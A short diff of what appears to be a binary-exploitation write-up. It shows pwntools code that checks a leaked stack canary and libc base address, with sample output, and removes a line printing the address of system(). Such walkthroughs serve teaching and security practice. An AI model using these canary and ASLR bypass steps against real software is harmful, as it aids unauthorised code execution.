@@ -776,8 +776,6 @@ log.success(f'Libc base: {hex(libc.address)}')
 assert hex(libc.address).endswith('000'), "libc_base doesn't end in 000 — offset may be wrong!"
 assert hex(canary).endswith('00'),        "Canary doesn't end in 00 — offset may be wrong!"
 
-log.success(f'system(): {hex(libc.sym["system"])}')
-
 p.close()
 ```
 
@@ -791,7 +789,6 @@ Expected output:
 [*] Raw output: 0xd3ac9d5b62541e00|0x7f08a5629d90
 [+] Canary:    0xd3ac9d5b62541e00
 [+] Libc base: 0x7f08a5600000
-[+] system(): 0x7f08a5650d70
 ```
 
 ---
